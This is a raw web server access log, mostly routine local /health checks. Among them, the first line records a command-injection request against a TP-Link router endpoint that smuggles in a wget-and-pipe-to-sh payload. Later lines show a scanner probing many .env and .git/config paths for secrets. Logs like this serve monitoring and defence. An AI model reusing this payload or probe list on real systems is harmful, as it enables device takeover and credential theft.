221.159.119.6 - - [10/Apr/2026:10:50:35 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 301 162 "-" "-" "-"
::1 - - [10/Apr/2026:10:50:45 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:10:51:15 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:10:51:46 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:10:52:16 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:10:52:46 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:10:53:16 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:10:53:46 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:10:54:16 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:10:54:46 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:10:55:17 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:10:55:47 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:10:56:17 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:10:56:47 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:10:57:17 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:10:57:47 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:10:58:17 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:10:58:47 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
64.62.197.167 - - [10/Apr/2026:10:59:02 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03`?\x87mC\x94F\xC2\xB0\xFC\x7Fxo\xB4\xBARL\x94?\xFA\x8B\xBB\xC6\x7F|\x02\xC7=\x9A\xE7\x19\xFC\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
::1 - - [10/Apr/2026:10:59:18 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:10:59:48 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:11:00:18 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
93.174.93.12 - - [10/Apr/2026:11:00:39 +0000] "GET / HTTP/1.0" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:15.0) Gecko/20120724 Debian Iceweasel/15.02" "-"
::1 - - [10/Apr/2026:11:00:48 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:11:01:18 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:11:01:48 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:11:02:18 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:11:02:49 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:11:03:19 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:11:03:49 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:11:04:19 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:11:04:49 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:11:05:19 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:11:05:49 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:11:06:20 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:11:06:50 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:11:07:20 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:11:07:50 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:11:08:20 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
185.177.72.61 - - [10/Apr/2026:11:08:28 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03D\x9B\xD0\x0E:!\xEFC\x1B\x0B\x069\x96d-\x22\x1C\x0C\xAF1\xFA\x8F\xA66i\xF5J\xB1m\x1CTD \xFB4\x18\x15k\x8F\xB3A!\xD3S$\xBD&u\x8Fu\x13\xF4\xAAq\xF7\x1Ct\xFB\x1E\x81\x1CA\xBF\xE0\x12\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 150 "-" "-" "-"
185.177.72.61 - - [10/Apr/2026:11:08:29 +0000] "GET / HTTP/1.1" 400 150 "-" "-" "-"
185.177.72.61 - - [10/Apr/2026:11:08:29 +0000] "GET / HTTP/1.1" 301 162 "-" "l9tcpid/v1.1.0" "-"
::1 - - [10/Apr/2026:11:08:50 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
::1 - - [10/Apr/2026:11:09:20 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
185.177.72.61 - - [10/Apr/2026:11:09:43 +0000] "GET /.env.stage HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:43 +0000] "GET /backup/.git/config HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:44 +0000] "GET /assets../.git/config HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:44 +0000] "GET /public/.git/config HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:45 +0000] "GET /api/.git/config HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:45 +0000] "GET /.env.live HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:46 +0000] "GET /.env.production.local HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:46 +0000] "GET /.env.testing HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:46 +0000] "GET /build/.env HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:46 +0000] "GET /configuration/.env HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:46 +0000] "GET /.env.dev HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:46 +0000] "GET /.env.test HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:46 +0000] "GET /files/.git/config HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:47 +0000] "GET /admin/.git/config HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:47 +0000] "GET /.env.local HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:48 +0000] "GET /.env_sample HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:48 +0000] "GET /.env.secret HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:49 +0000] "GET /.env.template HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:50 +0000] "GET /config/.env HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:50 +0000] "GET /settings/.env HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
185.177.72.61 - - [10/Apr/2026:11:09:50 +0000] "GET /.git/config HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
::1 - - [10/Apr/2026:11:09:50 +0000] "GET /health HTTP/1.1" 301 162 "-" "Wget" "-"
185.177.72.61 - - [10/Apr/2026:11:09:51 +0000] "GET /app/.git/config HTTP/1.1" 301 162 "-" "l9explore/1.2.2" "-"
